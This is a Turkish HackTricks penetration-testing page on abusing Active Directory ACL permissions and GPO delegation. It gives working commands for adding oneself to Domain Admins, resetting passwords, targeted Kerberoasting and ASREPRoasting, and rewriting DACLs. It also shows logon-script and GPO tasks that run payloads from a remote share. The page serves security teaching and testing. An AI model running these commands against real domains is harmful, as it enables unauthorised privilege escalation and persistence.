# Active Directory ACLs/ACEs'yi Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa büyük ölçüde şu tekniklerin bir özeti:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Daha fazla ayrıntı için orijinal makalelere bakın.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Bu ayrıcalık bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol verir. `GenericAll` hakları `Get-ObjectAcl` komutuyla doğrulandıktan sonra, bir saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanarak saldırgan kullanıcının parolasını sıfırlayabilir.
- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak hesabı kerberoastable hale getirin, sonra Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash'lerini çıkarıp kırmayı deneyin.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'ı devre dışı bırakın; böylece hesabı ASREPRoasting'e karşı savunmasız hale gelir.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Hakları Bir Grup Üzerinde**

Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` haklarına sahipse grup üyeliklerini değiştirmesine olanak tanır. Grubun distinguished name'ini `Get-NetGroup` ile belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Eklemek**: Bu doğrudan komutlarla veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux'ten, GenericAll/Write üyeliğiniz olduğunda kendinizi istediğiniz gruplara eklemek için BloodyAD'i kullanabilirsiniz. Hedef grup “Remote Management Users” içinde nested ise, o grubu dikkate alan hostlarda hemen WinRM erişimi kazanırsınız:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu ayrıcalıklara bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde sahip olmak şunlara izin verir:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini mümkün kılar.
- **Shadow Credentials**: Bu tekniği, ayrıcalıkları kullanarak shadow credentials oluşturarak bir bilgisayarın veya kullanıcı hesabının taklit edilmesi için kullanın.

## **WriteProperty on Group**

Bir kullanıcının belirli bir grup için (ör. `Domain Admins`) tüm nesneler üzerinde `WriteProperty` hakları varsa, şunları yapabilir:

- **Kendilerini Domain Admins Group'a eklemek**: `net user` ve `Add-NetGroupUser` komutlarının birleştirilmesiyle gerçekleştirilebilen bu yöntem, etki alanı (domain) içinde ayrıcalık yükseltmesine olanak tanır.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisini kullanarak kendini ekleme yapılabilir:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu, saldırganların belirli gruplarda `WriteProperty` hakkına sahipse, grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve yürütülmesi şununla gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password` için bir kullanıcının üzerinde `ExtendedRight`'a sahip olmak, mevcut parolayı bilmeden parola sıfırlamalarına izin verir. Bu hakkın doğrulanması ve sömürüsü PowerShell veya alternatif komut satırı araçlarıyla yapılabilir; bu, etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere bir kullanıcının parolasını sıfırlamak için çeşitli yöntemler sunar. Komutlar basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanır ve saldırı vektörlerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Grupta WriteOwner**

Bir saldırgan bir grup üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse, grubun sahipliğini kendine değiştirebilir. Bu, söz konusu grup `Domain Admins` olduğunda özellikle etkili olur; sahipliği değiştirmek grup öznitelikleri ve üyelik üzerinde daha geniş kontrol sağlar. Süreç, doğru nesnenin `Get-ObjectAcl` ile belirlenmesini ve ardından sahibi `Set-DomainObjectOwner` kullanarak SID veya isim ile değiştirmeyi içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Bu izin, bir attacker'ın user özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile attacker, bir user'ın logon script path'ini değiştirerek user logon olduğunda kötü amaçlı bir script'in çalıştırılmasını sağlayabilir. Bu, hedef user'ın `scriptpath` özelliğini attacker'ın script'ine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalıkla saldırganlar grup üyeliklerini değiştirebilir; örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanarak bir gruba kullanıcı eklemeyi veya kaldırmayı ve üyelik değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın kendisine nesne üzerinde `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu ile gerçekleştirilir; nesne üzerinde tam kontrol elde etmeye ve grup üyeliklerini değiştirme yeteneği sağlar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıkları suistimal etmeye çalışırken sınırlamalar bulunmaktadır.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Etki Alanında Replikasyon (DCSync)**

DCSync saldırısı, etki alanındaki belirli replikasyon izinlerini kullanarak bir Domain Controller'ı taklit eder ve kullanıcı kimlik bilgileri dahil olmak üzere verileri senkronize eder. Bu güçlü teknik, `DS-Replication-Get-Changes` gibi izinler gerektirir; bu da saldırganların bir Domain Controller'a doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanır. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirmesi

Group Policy Objects (GPOs) yönetimi için devredilen erişim önemli güvenlik riskleri doğurabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlı kullanım için suistimal edilebilir; PowerView kullanılarak şu şekilde tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Listeleme

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit'ın cmdlet'leri zincirlenebilir. Bu, belirli bir kullanıcının hangi GPO'ları yönetme iznine sahip olduğunu keşfetmeyi sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür; bu, potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politika Uygulanan OU'lar**: Bir politikadan etkilenen organizational units (OU'lar) `Get-DomainOU` kullanılarak tespit edilebilir.

GPO'ları listelemek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO Kötüye Kullanımı - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin hemen çalışacak bir zamanlanmış görev oluşturarak kod yürütmek için suistimal edilebilir. Bu, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna eklemek için yapılabilir ve yetkileri önemli ölçüde yükseltir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

The GroupPolicy module, eğer kuruluysa, yeni GPO'ların oluşturulmasına ve bağlanmasına ve etkilenen bilgisayarlarda backdoors çalıştırmak için registry values gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve yürütme için bir kullanıcının bilgisayara giriş yapmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse, yeni GPO oluşturmaya gerek kalmadan mevcut GPO'lara görev ekleyerek veya ayarları değiştirerek bunları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ları değiştirmenizi veya yeni GPO'lar oluşturmak için RSAT araçlarını kullanmanızı gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Politika Güncellemesini Zorla

GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak, özellikle bir değişiklik yaptıktan sonra, hedef bilgisayarda `gpupdate /force` komutunu kullanarak anlık bir politika güncellemesi zorlayabilirsiniz. Bu komut, GPO'lara yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### İşleyiş

Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, örneğin `Misconfigured Policy`, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan script'ler veya komut satırı araçlarıyla oluşturulur.

`New-GPOImmediateTask` tarafından üretilen XML yapılandırma dosyasında gösterildiği gibi, görevin yapısı zamanlanmış görevin ayrıntılarını — yürütülecek komut ve tetikleyiciler dahil — ortaya koyar. Bu dosya, GPO'lar içinde zamanlanmış görevlerin nasıl tanımlandığını ve yönetildiğini gösterir ve politika uygulaması kapsamında rastgele komutlar veya script'ler çalıştırmak için bir yöntem sağlar.

### Kullanıcılar ve Gruplar

GPO'lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin manipüle edilmesine izin verir. Users and Groups politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` grubu gibi ayrıcalıklı gruplara kullanıcı ekleyebilirler. Bu, GPO yönetim izinlerinin delege edilmesi sayesinde mümkündür; bu izinler politika dosyalarının yeni kullanıcılar ekleyecek veya grup üyeliklerini değiştirecek şekilde düzenlenmesine olanak tanır.

Users and Groups için XML yapılandırma dosyası bu değişikliklerin nasıl uygulandığını açıklar. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler genelinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla doğrudan bir ayrıcalık yükseltme yaklaşımı sunar.

Ayrıca, oturum açma/oturum kapatma script'lerini kullanma, autorun için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya servis yapılandırmalarını düzenleme gibi kod çalıştırma veya kalıcılık sağlama için ek yöntemler de düşünülebilir. Bu teknikler, GPO'ların kötüye kullanımı yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sağlar.

## Kaynaklar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
